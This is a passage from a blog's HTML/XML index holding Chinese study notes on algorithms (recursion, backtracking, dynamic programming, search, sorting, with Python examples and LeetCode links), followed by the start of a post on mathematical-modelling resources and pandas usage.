用于获取两个点的中间点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_middle</span>(<span class="params">p1,p2</span>):</span><br><span class="line">    <span class="keyword">return</span> ((p1[<span class="number">0</span>] + p2[<span class="number">0</span>])/<span class="number">2</span>,(p1[<span class="number">1</span>] + p2[<span class="number">1</span>])/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 调用代码</span></span><br><span class="line">    myTurtle = turtle.Turtle()</span><br><span class="line">    window = turtle.Screen()</span><br><span class="line">    <span class="comment"># 最大三角形的3个顶点坐标</span></span><br><span class="line">    points = [[-<span class="number">200</span>,-<span class="number">100</span>],[<span class="number">0</span>,<span class="number">200</span>],[<span class="number">200</span>,-<span class="number">100</span>]]</span><br><span class="line">    <span class="comment"># 开始绘制三角形，其实degree为5，直到减小到0为止</span></span><br><span class="line">    sierpinski(points,<span class="number">5</span>,myTurtle)</span><br><span class="line">    <span class="comment"># 将海龟画笔抬起，否则移动海龟画笔会一直绘制直线。</span></span><br><span class="line">    myTurtle.up()</span><br><span class="line">    <span class="comment"># 将海龟画笔移动到200，200的位置，以便原理绘制好的三角形</span></span><br><span class="line">    myTurtle.setpos(<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">    <span class="comment"># 显示海龟绘图窗口，绘制完后，单击关闭窗口</span></span><br><span class="line">    window.exitonclick()</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-回溯"><a href="#3-回溯" class="headerlink" title="3 回溯"></a>3 回溯</h3><h4 id="3-1-普通回溯"><a href="#3-1-普通回溯" class="headerlink" title="3.1 普通回溯"></a>3.1 普通回溯</h4><blockquote><p>同理于递归。</p><p>思路：当前操作？子问题？下一子问题？</p><p>时间复杂度为指数级别 $O(a^n)$，易超时。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/">17. 电话号码的字母组合</a></li></ul></li></ul><h4 id="3-2-子集型回溯"><a href="#3-2-子集型回溯" class="headerlink" title="3.2 子集型回溯"></a>3.2 子集型回溯</h4><blockquote><p>每个元素选或不选，也可以是选列表之间逗号，而非元素。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/subsets/">78. 子集</a></li><li><a href="https://leetcode.cn/problems/palindrome-partitioning/">131. 分割回文串</a>​</li></ul></li></ul><h4 id="3-3-组合型回溯"><a href="#3-3-组合型回溯" class="headerlink" title="3.3 组合型回溯"></a>3.3 组合型回溯</h4><blockquote><p>组合问题。</p><p>剪枝：后续不存在满足条件的值将直接返回，不再递归。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/combinations/">77. 组合</a></li><li><a href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III</a></li></ul></li></ul><h3 id="4-分治"><a href="#4-分治" class="headerlink" title="4 分治"></a>4 分治</h3><blockquote><p>将问题分为若干更小规模的部分。通过解决每个小规模部分问题，最后解决大问题。</p></blockquote><h4 id="4-1-优化问题与贪心算法"><a href="#4-1-优化问题与贪心算法" class="headerlink" title="4.1 优化问题与贪心算法"></a>4.1 优化问题与贪心算法</h4><blockquote><p>贪心：每次都试图解决问题尽量大的一部分。（从顶到底依次最优）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找零问题：找钱</span></span><br><span class="line"><span class="comment"># 未改进，存在重复计算</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recMC</span>(<span class="params">coinValueList:<span class="built_in">list</span>,change:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    minCoins = change</span><br><span class="line">    <span class="keyword">if</span> change <span class="keyword">in</span> coinValueList:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= change]:</span><br><span class="line">            numCoins = <span class="number">1</span> + recMC((coinValueList),change - i)</span><br><span class="line">            <span class="keyword">if</span> numCoins &lt; minCoins:</span><br><span class="line">                minCoins = numCoins</span><br><span class="line">    <span class="keyword">return</span> minCoins</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改进，最优解存到列表中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recDC</span>(<span class="params">coinValueList:<span class="built_in">list</span>,change:<span class="built_in">int</span>,knownResults:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    minCoins = change</span><br><span class="line">    <span class="keyword">if</span> change <span class="keyword">in</span> coinValueList:</span><br><span class="line">        knownResults[change] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> knownResults[change] &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> knownResults[change]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= change]:</span><br><span class="line">            numCoins = <span class="number">1</span> + recDC((coinValueList),change - i,knownResults)</span><br><span class="line">            <span class="keyword">if</span> numCoins &lt; minCoins:</span><br><span class="line">                minCoins = numCoins</span><br><span class="line">                knownResults[change] = minCoins</span><br><span class="line">    <span class="keyword">return</span> minCoins</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(recDC([<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">25</span>],<span class="number">63</span>,[<span class="number">0</span>]*<span class="number">64</span>))</span><br></pre></td></tr></table></figure><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/maximum-number-of-consecutive-values-you-can-make/">1798. 你能构造出连续值的最大数目</a></li><li><a href="https://leetcode.cn/problems/find-valid-matrix-given-row-and-column-sums/">1605. 给定行和列的和求可行矩阵</a></li></ul></li></ul><h4 id="4-2-动态规划-dp"><a href="#4-2-动态规划-dp" class="headerlink" title="4.2 动态规划  [dp]"></a>4.2 动态规划  [dp]</h4><blockquote><p>把多阶段过程转化为一系列单阶段问题，利用各阶段之间的关系，逐个求解。（从底到顶依次最优）</p><p>同理于回溯：当前操作？子问题？下一子问题？</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例：找零</span></span><br><span class="line"><span class="comment"># 找零问题：找钱</span></span><br><span class="line"><span class="comment"># 未改进，只知道个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dpMakeChange</span>(<span class="params">coinValueList:<span class="built_in">list</span>,change:<span class="built_in">int</span>,minCoins:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> cents <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,change + <span class="number">1</span>):</span><br><span class="line">        coinCount = cents</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= cents ]:</span><br><span class="line">            <span class="keyword">if</span> minCoins[cents - j] + <span class="number">1</span> &lt; coinCount:</span><br><span class="line">                coinCount = minCoins[cents - j] + <span class="number">1</span></span><br><span class="line">        minCoins[cents] = coinCount</span><br><span class="line">    <span class="keyword">return</span> minCoins[change]</span><br><span class="line"><span class="built_in">print</span>(dpMakeChange([<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">25</span>],<span class="number">63</span>,[<span class="number">0</span>]*<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改进，可以知道找的硬币</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exdpMakeChange</span>(<span class="params">coinValueList:<span class="built_in">list</span>,change:<span class="built_in">int</span>,minCoins:<span class="built_in">list</span>,coinsUsed:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">for</span> cents <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,change + <span class="number">1</span>):</span><br><span class="line">        coinCount = cents</span><br><span class="line">        newCoin = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= cents ]:</span><br><span class="line">            <span class="keyword">if</span> minCoins[cents - j] + <span class="number">1</span> &lt; coinCount:</span><br><span class="line">                coinCount = minCoins[cents - j] + <span class="number">1</span></span><br><span class="line">                newCoin = j</span><br><span class="line">        minCoins[cents] = coinCount</span><br><span class="line">        coinsUsed[cents] = newCoin</span><br><span class="line">    <span class="keyword">return</span> minCoins[change]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printCoins</span>(<span class="params">coinsUsed,change</span>):</span><br><span class="line">    coin = change</span><br><span class="line">    <span class="keyword">while</span> coin &gt; <span class="number">0</span>:</span><br><span class="line">        thisCoin = coinsUsed[coin]</span><br><span class="line">        <span class="built_in">print</span>(thisCoin)</span><br><span class="line">        coin = coin - thisCoin</span><br><span class="line">amnt = <span class="number">63</span></span><br><span class="line">clist = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">25</span>]</span><br><span class="line">coinsUsed = [<span class="number">0</span>] * (amnt + <span class="number">1</span>)</span><br><span class="line">coinCount = [<span class="number">0</span>] * (amnt + <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Making change for&quot;</span>,amnt,<span class="string">&quot;requires&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(exdpMakeChange(clist,amnt,coinCount,coinsUsed),<span class="string">&quot;coins&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;They are:&quot;</span>)</span><br><span class="line">printCoins(coinsUsed,amnt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The used list is as follows:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(coinsUsed)</span><br></pre></td></tr></table></figure><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/house-robber/">198. 打家劫舍</a></li><li><a href="https://leetcode.cn/problems/longest-arithmetic-subsequence/">1027. 最长等差数列</a></li></ul></li></ul><h4 id="4-3-区间dp"><a href="#4-3-区间dp" class="headerlink" title="4.3 区间dp"></a>4.3 区间dp</h4><blockquote><p>从小区间转移到大区间。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/minimum-cost-to-merge-stones/">1000. 合并石头的最低成本 - 力扣（LeetCode）</a></li><li><a href="https://leetcode.cn/problems/longest-palindromic-subsequence/">516. 最长回文子序列</a></li><li><a href="https://leetcode.cn/problems/minimum-score-triangulation-of-polygon/">1039. 多边形三角剖分的最低得分</a></li></ul></li></ul><h4 id="4-4-数位dp"><a href="#4-4-数位dp" class="headerlink" title="4.4 数位dp"></a>4.4 数位dp</h4><blockquote><p>题型：给定一个闭区间 [ L , R ]，求这个区间中满足 “某种条件” 的数的总量。</p><p>思路：$Ans[L,R] = Ans[1,R] - Ans[1,L-1]$（求出全部后减去下界）</p></blockquote><hr><h3 id="5-查找"><a href="#5-查找" class="headerlink" title="5 查找"></a>5 查找</h3><h4 id="5-1-二分查找"><a href="#5-1-二分查找" class="headerlink" title="5.1 二分查找"></a>5.1 二分查找</h4><blockquote><p><a href="https://blog.csdn.net/YMWM_/article/details/122378152">bisect库</a></p><p>求最小中的最大值或者最大值中的最小值，一般可以考虑二分查找。</p><p>有序列表，中间开始找，然后依次缩小一半。</p><p>注意：明确 lp 和 rp 指向的区间是开还是闭区间，否则容易死循环。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接调库</span></span><br><span class="line"><span class="keyword">import</span> bisect</span><br><span class="line">bisect(ls,x) <span class="comment"># 同right</span></span><br><span class="line">bisect_left(ls,x) <span class="comment"># 最左边的</span></span><br><span class="line">bisec_right(ls,x) <span class="comment"># 最右边的并且结果idx加一</span></span><br></pre></td></tr></table></figure><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array/">34. 在排序数组中查找元素的第一个和最后一个位置</a></li><li><a href="https://leetcode.cn/problems/find-peak-element/">162. 寻找峰值</a></li><li><a href="https://leetcode.cn/problems/find-minimum-in-rotated-sorted-array/">153. 寻找旋转排序数组中的最小值</a></li><li><a href="https://leetcode.cn/problems/search-in-rotated-sorted-array/">33. 搜索旋转排序数组</a></li></ul></li></ul><h4 id="5-2-二叉搜索树"><a href="#5-2-二叉搜索树" class="headerlink" title="5.2 二叉搜索树"></a>5.2 二叉搜索树</h4><blockquote><p>对一个节点来说，左子树的值都小于它，右子树的值都大于它。</p><p>前序遍历：根左右。</p><p>中序遍历：左根右。</p><p>后序遍历：左右根。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></li></ul></li></ul><h4 id="5-3-二叉树的最近公共祖先"><a href="#5-3-二叉树的最近公共祖先" class="headerlink" title="5.3 二叉树的最近公共祖先"></a>5.3 二叉树的最近公共祖先</h4><blockquote><p>获得左右值是否等于目标值，判断值存在以此判断祖先。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></li><li><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先</a></li></ul></li></ul><h4 id="5-4-BFS"><a href="#5-4-BFS" class="headerlink" title="5.4 BFS"></a>5.4 BFS</h4><blockquote><p>广度优先搜索。</p><p>时间：$O( |V| + |E| )$（节点数 + 边数）</p></blockquote><ul><li><p>为了跟踪顶点的加入过程，并避免重复顶点，要为顶点增加3个属性：</p><ul><li><p>distance：从起始顶点到此顶点路径长度</p></li><li><p>predecessor：可反向追溯到起点</p></li><li><p>color：标识了此顶点是尚未发现（白色)、已经发现（灰色)、还是已经完成探索（黑色）</p></li><li><p>还需要用一个队列 Queue 来对已发现的顶点进行排列：<br>决定下一个要探索的顶点（队首顶点）</p></li></ul></li><li><p>过程：</p><ul><li>从起始顶点s开始，作为刚发现的顶点，标注为灰色，距离为0，前驱为None，加入队列，接下来是个循环迭代过程：<ol><li>从队首取出一个顶点作为当前顶点。</li><li>遍历当前顶点的邻接顶点，如果是尚未发现的白色顶点，则将其颜色改为灰色（已发现），距离增加1，前驱顶点为当前顶点，加入到队列中。</li><li>遍历完成后，将当前顶点设置为黑色(已探索过)，循环回到步骤1的队首取当前顶点。</li></ol></li></ul></li><li><p>例题</p><ul><li><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></li><li><a href="https://leetcode.cn/problems/binary-tree-zigzag-level-order-traversal/">103. 二叉树的锯齿形层序遍历</a></li><li><a href="https://leetcode.cn/problems/find-bottom-left-tree-value/">513. 找树左下角的值</a></li></ul></li></ul><h4 id="5-5-DFS"><a href="#5-5-DFS" class="headerlink" title="5.5 DFS"></a>5.5 DFS</h4><blockquote><p>深度优先搜索。</p><p>添加属性同理于BFS，过程是从顶点开始一直向下搜索，直到没有路径可以走且结束条件为满足时返回上一层，继续搜索。<br>还需要用一个栈 Stack 来记录探索过的顶点。（用于返回上一顶点）</p><p>有时候深度优先搜索会创建多棵树，称为 “深度优先森林”<br>时间：$O( |V| + |E| )$（dfs + dfsvisit）</p></blockquote><hr><h3 id="6-排序"><a href="#6-排序" class="headerlink" title="6 排序"></a>6 排序</h3><blockquote><p><a href="https://visualgo.net/zh/sorting?slide=1">可视化排序</a></p></blockquote><h4 id="6-1-冒泡排序与选择排序"><a href="#6-1-冒泡排序与选择排序" class="headerlink" title="6.1 冒泡排序与选择排序"></a>6.1 冒泡排序与选择排序</h4><blockquote><p>冒泡排序：每次将最大或最小项置顶，不断交换位置，直到完成遍历。</p><p>改进：加一个exchanges = False，如果一趟循环未发生任何排序则保持False表示已经排好了序。</p><p>时间：$O(n^2)$</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">if</span> lst[i] &gt; lst[j]:</span><br><span class="line">            lst[i],lst[j] = lst[j],lst[i]</span><br></pre></td></tr></table></figure><h4 id="6-2-选择排序"><a href="#6-2-选择排序" class="headerlink" title="6.2 选择排序"></a>6.2 选择排序</h4><blockquote><p>同理冒泡，但是一开始不做交换，只记录位置，到单次循环的最后一次才进行交换。</p><p>时间：$O(n^2)$</p></blockquote><h4 id="6-3-插入排序"><a href="#6-3-插入排序" class="headerlink" title="6.3 插入排序"></a>6.3 插入排序</h4><blockquote><p>维持一个已经排好序的子列表，位置一直在列表前部，然后逐步扩大到这个子列表直到全表，例如抓牌。</p><p>时间：$O(n^2)$</p></blockquote><h4 id="6-4-希尔排序"><a href="#6-4-希尔排序" class="headerlink" title="6.4 希尔排序"></a>6.4 希尔排序</h4><blockquote><p>因为列表越有序，插入排序比对次数越少，所以希尔排序就是分块的插入排序。间隔一般为n / 2，例：选1,4,7项。</p><p>时间：$O(n^{\frac{2}{3}})$ </p></blockquote><h4 id="6-5-归并排序"><a href="#6-5-归并排序" class="headerlink" title="6.5 归并排序"></a>6.5 归并排序</h4><blockquote><p> 递归算法，将数据表持续分裂成两半，对两半分别进行归并排序。（稳定）<br>​​<br>​时间分裂：$O(logn)$，归并：$O(n)$，总：$O(nlogn)$，会牺牲空间</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge_Sort</span>(<span class="params">lst:<span class="built_in">list</span></span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(lst) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> lst</span><br><span class="line">    mid = <span class="built_in">len</span>(lst) // <span class="number">2</span></span><br><span class="line">    left = merge_Sort(lst[:mid])</span><br><span class="line">    right = merge_Sort(lst[mid:])</span><br><span class="line">    merged = []</span><br><span class="line">    <span class="keyword">while</span> left <span class="keyword">and</span> right:</span><br><span class="line">        <span class="keyword">if</span> left[<span class="number">0</span>] &lt;= right[<span class="number">0</span>]:</span><br><span class="line">            merged.append(left.pop(<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            merged.append(right.pop(<span class="number">0</span>))</span><br><span class="line">    merged.extend(right <span class="keyword">if</span> right <span class="keyword">else</span> left)</span><br><span class="line">    <span class="keyword">return</span> merged</span><br><span class="line"><span class="built_in">print</span>(merge_Sort([<span class="number">93</span>,<span class="number">54</span>,<span class="number">12</span>,<span class="number">74</span>,<span class="number">21</span>,<span class="number">5</span>,<span class="number">78</span>,<span class="number">22</span>,<span class="number">94</span>,<span class="number">34</span>]))</span><br></pre></td></tr></table></figure><h4 id="6-6-快速排序"><a href="#6-6-快速排序" class="headerlink" title="6.6 快速排序"></a>6.6 快速排序</h4><blockquote><p>递归算法，依据一个”中值”数据项把数据表分为两半：小于中值的一半和大于中值的一半，然后再分别进行快速排序。（不稳定）</p><p>时间总能分裂：$O(logn)$，移动：$O(n)$，总：$O(nlogn)$</p><p>若中值偏离中部，时间：$O(n^2)$，因为递归会导致其不如冒泡，</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">lst:<span class="built_in">list</span></span>):</span><br><span class="line">    quickSortHelper(lst,<span class="number">0</span>,<span class="built_in">len</span>(lst)-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quickSortHelper</span>(<span class="params">lst:<span class="built_in">list</span>,first:<span class="built_in">int</span>,last:<span class="built_in">int</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> first &lt; last:</span><br><span class="line">        splitpoint = partition(lst,first,last)</span><br><span class="line">        quickSortHelper(lst,first,splitpoint-<span class="number">1</span>)</span><br><span class="line">        quickSortHelper(lst,splitpoint+<span class="number">1</span>,last)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">lst:<span class="built_in">list</span>,first:<span class="built_in">int</span>,last:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    pivotvalue = lst[first]</span><br><span class="line">    leftmark = first + <span class="number">1</span></span><br><span class="line">    rightmark = last</span><br><span class="line">    done = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        <span class="keyword">while</span> leftmark &lt;= rightmark <span class="keyword">and</span> lst[leftmark] &lt;= pivotvalue:</span><br><span class="line">            leftmark = leftmark + <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> lst[rightmark] &gt;= pivotvalue <span class="keyword">and</span> rightmark &gt;= leftmark:</span><br><span class="line">            rightmark = rightmark - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> rightmark &lt; leftmark:</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lst[leftmark],lst[rightmark] = lst[rightmark],lst[leftmark]</span><br><span class="line">    lst[first],lst[rightmark] = lst[rightmark],lst[first]</span><br><span class="line">    <span class="keyword">return</span> rightmark</span><br><span class="line"></span><br><span class="line">lst = [<span class="number">54</span>,<span class="number">26</span>,<span class="number">93</span>,<span class="number">17</span>,<span class="number">77</span>,<span class="number">31</span>,<span class="number">44</span>,<span class="number">55</span>,<span class="number">20</span>]</span><br><span class="line">quickSort(lst)</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h4 id="6-7-堆排序"><a href="#6-7-堆排序" class="headerlink" title="6.7 堆排序"></a>6.7 堆排序</h4><blockquote><p>二叉堆的排序。</p><p>时间：$O(nlogn)$</p></blockquote><h4 id="6-8-空间换时间"><a href="#6-8-空间换时间" class="headerlink" title="6.8 空间换时间"></a>6.8 空间换时间</h4><blockquote><p>自己写的玩的。</p><p>设定空间，一一对应设置数量，最后再遍历获得列表，这样就是排序完成。</p><p>时间：$O(m)$，空间：$O(m)$，依照空间大小决定</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">space_Sort</span>(<span class="params">lst:<span class="built_in">list</span>,space:<span class="built_in">int</span></span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">    new_lst = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(space)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        new_lst[i] += <span class="number">1</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(new_lst)):</span><br><span class="line">        j = new_lst[i]</span><br><span class="line">        <span class="keyword">while</span> j &gt; <span class="number">0</span>:</span><br><span class="line">            res.append(i)</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><hr><h3 id="7-条件"><a href="#7-条件" class="headerlink" title="7 条件"></a>7 条件</h3><h4 id="7-1-单调栈"><a href="#7-1-单调栈" class="headerlink" title="7.1 单调栈"></a>7.1 单调栈</h4><blockquote><p>场景：前值小于后值的最小索引位。</p></blockquote><ul><li>例子<ul><li><a href="https://leetcode.cn/problems/online-stock-span/">901. 股票价格跨度</a></li><li><a href="https://leetcode.cn/problems/next-greater-node-in-linked-list/">1019. 链表中的下一个更大节点</a></li></ul></li></ul><h4 id="7-2-双指针"><a href="#7-2-双指针" class="headerlink" title="7.2 双指针"></a>7.2 双指针</h4><ul><li><p>同向双指针</p><blockquote><p>又称为滑动窗口。</p><p>场景：找主串中的子串，满足条件时移动右指针，不满足条件时移动左指针。</p><p>方法：设置两个索引找到字符串中的两个位置。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度最小的子数组</a></li><li><a href="https://leetcode.cn/problems/subarray-product-less-than-k/">713. 乘积小于 K 的子数组</a></li><li><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></li></ul></li><li>习题<ul><li><a href="https://leetcode.cn/problems/magical-string/">481. 神奇字符串</a></li><li><a href="https://leetcode.cn/problems/fruit-into-baskets/">904. 水果成篮</a></li></ul></li></ul></li><li><p>相向双指针</p><blockquote><p>场景：有序列表中找两数之和，中间围成的面积。</p><p>方法：双指针，但是从头尾开始。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted/">167. 两数之和 II - 输入有序数组</a></li><li><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></li><li><a href="https://leetcode.cn/problems/container-with-most-water/">11. 盛最多水的容器</a></li><li><a href="https://leetcode.cn/problems/trapping-rain-water/">42. 接雨水</a></li></ul></li></ul></li></ul><h4 id="7-3-前缀和"><a href="#7-3-前缀和" class="headerlink" title="7.3 前缀和"></a>7.3 前缀和</h4><blockquote><p>场景：需要用到数组中的前几项和。</p><p>方法：相加前几项存入新数组中。</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/shortest-subarray-with-sum-at-least-k/">862. 和至少为 K 的最短子数组</a></li><li><a href="https://leetcode.cn/problems/longest-well-performing-interval/">1124. 表现良好的最长时间段</a></li></ul></li></ul><h4 id="7-4-二进制位图"><a href="#7-4-二进制位图" class="headerlink" title="7.4 二进制位图"></a>7.4 二进制位图</h4><blockquote><p>场景：题目需求为两种情况时。</p><p>方法：设置二进制数来代表状态。</p></blockquote><ul><li><p>例题</p><ul><li><p><a href="https://leetcode.cn/problems/power-of-two/">231. 2 的幂</a></p></li><li><p><a href="https://leetcode.cn/problems/letter-case-permutation/">784. 字母大小写全排列</a></p></li></ul></li></ul><h4 id="7-5-模运算"><a href="#7-5-模运算" class="headerlink" title="7.5 模运算"></a>7.5 模运算</h4><blockquote><p>场景：乘除取指定数字位数。</p><p>方法：</p><p>$(a+b)MODm=((aMODm)+(bMODm))MODm$</p><p>$(a<em>b)MODm=((aMODm)</em>(bMODm))MODm$</p></blockquote><ul><li>例题<ul><li><a href="https://leetcode.cn/problems/smallest-integer-divisible-by-k/">1015. 可被 K 整除的最小整数</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模</title>
      <link href="/posts/a66872a2.html"/>
      <url>/posts/a66872a2.html</url>
      
        <content type="html"><![CDATA[<h1 id="数学建模"><a href="#数学建模" class="headerlink" title="数学建模"></a>数学建模</h1><blockquote><p>文献查询：</p><p><a href="http://scholar.scqylaw.com/">谷歌学术镜像_Google镜像站 (scqylaw.com)</a></p><p><a href="https://www.oalib.com/">Open Access Library (OALib)</a></p><p>数据查询：</p><p><a href="https://data.stats.gov.cn/">国家数据 (stats.gov.cn)</a></p><p><a href="https://github.com/awesomedata/awesome-public-datasets">awesome-public-datasets</a></p><p><a href="https://www.epsnet.com.cn/index.html#/Index">EPSDATA官网 (epsnet.com.cn)</a></p></blockquote><hr><h1 id="Python图形处理库"><a href="#Python图形处理库" class="headerlink" title="Python图形处理库"></a>Python图形处理库</h1><h2 id="一、panda库"><a href="#一、panda库" class="headerlink" title="一、panda库"></a>一、panda库</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取xls文件</span></span><br><span class="line">data = pd.read_excel(<span class="string">r&#x27;.\data.xlsx&#x27;</span>,<span class="string">&#x27;sheet1&#x27;</span>)</span><br><span class="line"><span class="comment"># 标题行</span></span><br><span class="line">lst = data.columns</span><br><span class="line"><span class="comment"># 数据行</span></span><br><span class="line">data.loc[row]</span><br><span class="line"><span class="comment"># 数据行列（从0开始）</span></span><br><span class="line">data.iloc[row] <span class="comment"># 一行数据</span></span><br><span class="line">data.iloc[row,col] <span class="comment"># 具体数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据结构</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;col1&#x27;</span>:col_1, <span class="string">&#x27;col2&#x27;</span>:col_2&#125;)</span><br><span class="line"><span class="comment"># 打开文件写入数据</span></span><br><span class="line">writer = pd.ExcelWriter(<span class="string">&#x27;output.xlsx&#x27;</span>)</span><br><span class="line"><span class="comment"># 写入数据</span></span><br><span class="line">df.to_excel(writer,sheet_name=<span class="string">&#x27;Sheet1&#x27;</span>,index=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 保存</span></span><br><span class="line">writer._save()</span><br></pre></td></tr></table></figure><hr><h2 id="二、matlab库"><a href="#二、matlab库" class="headerlink" title="二、matlab库"></a>二、matlab库</h2><blockquote><p><a href="https://zhuanlan.zhihu.com/p/489552450">【Matplotlib】add_subplot 和 subplots_adjust</a></p></blockquote><figure class="highlight 